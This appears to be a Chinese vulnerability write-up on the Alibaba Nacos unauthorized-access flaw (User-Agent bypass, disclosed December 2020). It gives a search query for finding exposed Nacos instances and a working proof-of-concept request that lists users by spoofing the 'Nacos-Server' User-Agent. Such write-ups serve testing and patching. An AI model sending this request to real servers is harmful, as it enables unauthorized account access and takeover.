# Alibaba Nacos user 未授权访问漏洞

## 漏洞描述

2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。

## 漏洞影响

<a-checkbox checked>Alibaba Nacos </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="NACOS"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1679978968874-19b918f8-6501-448d-b9c2-9bbdb48b43b7.png)

验证POC

```javascript
GET /nacos/v1/auth/users?pageNo=1&pageSize=9
User-Agent: Nacos-Server
```

![img](../../../.vuepress/public/img/1679979333660-14aa3d9c-2581-48a4-b482-27912d98f75d.png)